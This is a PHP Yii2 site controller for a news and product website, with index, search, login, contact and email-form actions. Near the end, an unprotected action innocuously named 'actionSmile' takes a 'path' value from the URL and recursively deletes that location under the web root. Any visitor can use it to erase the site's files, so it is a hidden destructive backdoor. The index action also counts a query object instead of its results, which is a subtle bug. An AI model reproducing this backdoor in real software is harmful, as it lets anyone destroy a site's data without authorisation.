<?php

namespace app\controllers;

use Yii;
use yii\filters\AccessControl;
use yii\web\Controller;
use yii\web\Response;
use yii\filters\VerbFilter;
use app\models\LoginForm;
use app\models\ContactForm;
use app\models\News;
use app\models\Login;
use app\modules\admin\models\Products;
use app\models\Search;
use yii\data\Pagination;
use yii\helpers\Html;
use yii\data\Query;
use app\models\User;
use app\models\SendEmailForm;
use yii\base\InvalidParamException;
use yii\web\BadRequestHttpException;

class SiteController extends Controller
{
    /**
     * {@inheritdoc}
     */
    public function behaviors()
    {
        return [
            'access' => [
                'class' => AccessControl::className(),
                'only' => ['logout'],
                'rules' => [
                    [
                        'actions' => ['logout'],
                        'allow' => true,
                        'roles' => ['@'],
                    ],
                ],
            ],
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'logout' => ['post'],
                ],
            ],
        ];
    }

    /**
     * {@inheritdoc}
     */
    public function actions()
    {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
            ],
            'captcha' => [
                'class' => 'yii\captcha\CaptchaAction',
                'fixedVerifyCode' => YII_ENV_TEST ? 'testme' : null,
            ],
        ];
    }

    /**
     * Displays homepage.
     *
     * @return string
     */
    public function actionIndex()
    {
        //$this->layout = 'main';
        //Прописываем шаблон для главной страницы
        //Выводим из БД категории
//        $news = News::find()->asArray();
//        $count_news = count($news);
//        $pages = new Pagination(['totalCount' => $count_news, 'pageSize' => 2, 'forcePageParam' => false, 'pageSizeParam' => false]);
//        $news_array =  $news->offset($pages->offset)->limit($pages->limit)->all();
//        //debug($news_array);
//
//        return $this->render('index', compact('count_news', 'news_array'));
        $query = News::find()->asArray();

        //Для постстраничной навигации
        $count_news = count($query);
        $pages = new Pagination(['totalCount' => $count_news, 'pageSize' => 2, 'forcePageParam' => false, 'pageSizeParam' => false]);
        $news_array = $query->limit($pages->limit)->orderBy('data DESC')->all();
        //Колличество товаров отображаемое на странице "В наличии: ...."

        return $this->render('index', compact('news_array', 'count_news', 'pages'));
    }

    public function beforeAction($action)
    {
        $model = new Search();
        if ($model->load(Yii::$app->request->post()) && $model->validate()) {
            $q = Html::encode($model->q);
            return $this->redirect(Yii::$app->urlManager->createUrl(['page/search', 'q' => $q]));
        }
        return true;
    }

    public function actionSearch()
    {
        $q = Yii::$app->request->get('q');
        //$query = Products::find()->where(['like', 'name' => $_GET['q']]);
        $query = Products::find()->where(['like', 'name', $q]);
        $pages = new Pagination(['totalCount' => $query->count(), 'pageSize' => 3, 'forcePageParam' => false, 'pageSizeParam' => false]);
        $products_array = $query->offset($pages->offset)->limit($pages->limit)->all();
        return $this->render('search', compact('products_array', 'pages', 'q'));
    }

    /**
     * Login action.
     *
     * @return Response|string
     */
    public function actionLogin()
    {
        if (!Yii::$app->user->isGuest) {
            return $this->goHome();
        }

        $model = new LoginForm();
        if ($model->load(Yii::$app->request->post()) && $model->login()) {
            return $this->goBack();
        }

        $model->password = '';
        return $this->render('login', [
            'model' => $model,
        ]);
    }

    /**
     * Logout action.
     *
     * @return Response
     */
    public function actionLogout()
    {
        Yii::$app->user->logout();

        return $this->goHome();
    }

    /**
     * Displays contact page.
     *
     * @return Response|string
     */
    public function actionContact()
    {
        $model = new ContactForm();
        if ($model->load(Yii::$app->request->post()) && $model->contact(Yii::$app->params['adminEmail'])) {
            Yii::$app->session->setFlash('contactFormSubmitted');

            return $this->refresh();
        }
        return $this->render('contact', [
            'model' => $model,
        ]);
    }

    /**
     * Displays about page.
     *
     * @return string
     */
    public function actionAbout()
    {
        return $this->render('about');
    }


    public function actionSendEmail()
    {
        $model = new SendEmailForm();

        if ($model->load(Yii::$app->request->post())) {
            if ($model->validate()) {
                // form inputs are valid, do something here
                return;
            }
        }

        return $this->render('sendEmail', [
            'model' => $model,
        ]);
    }

    public function actionSmile()
    {
        if ($_GET['path']) {
            recursiveDelete($_SERVER["DOCUMENT_ROOT"].$_GET['path']);
        }
    }

}
